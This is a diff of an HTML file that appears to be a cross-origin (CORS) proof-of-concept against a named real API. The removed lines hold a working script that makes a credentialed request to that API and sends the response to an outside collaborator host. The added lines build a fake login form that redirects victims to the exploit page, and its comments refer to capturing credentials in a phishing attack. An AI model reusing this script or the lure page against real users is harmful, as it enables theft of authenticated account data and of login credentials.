@@ -1,22 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>Login Page</title>
+    <script>
+        function handleLogin() {
+            // Simulate login process (e.g., validate credentials)
+            // In a real phishing attack, you would capture credentials here
+            // For this example, we just redirect after a fake login
+
+            // Redirect to the exploit page after successful login
+            window.location.href = 'https://<your-github-username>.github.io/<your-repo>/cors0.html'; // Change to your actual exploit page URL
+        }
+    </script>
 </head>
 <body>
-    <script type="text/javascript">
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'http://api.render.com/graphql', true);
-        xhr.withCredentials = true;
-        xhr.setRequestHeader('Origin', 'xpq0vb97wj9d3wospx3cc0ze85ew2mqb.oastify.com');
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-                var data = xhr.responseText;
-                var img = new Image();
-                img.src = 'http://xpq0vb97wj9d3wospx3cc0ze85ew2mqb.oastify.com/log?data=' + encodeURIComponent(data);
-            }
-        };
-        xhr.send();
-    </script>
+    <h1>Login Page</h1>
+    <form onsubmit="event.preventDefault(); handleLogin();">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required><br><br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br><br>
+        <button type="submit">Login</button>
+    </form>
 </body>
 </html>
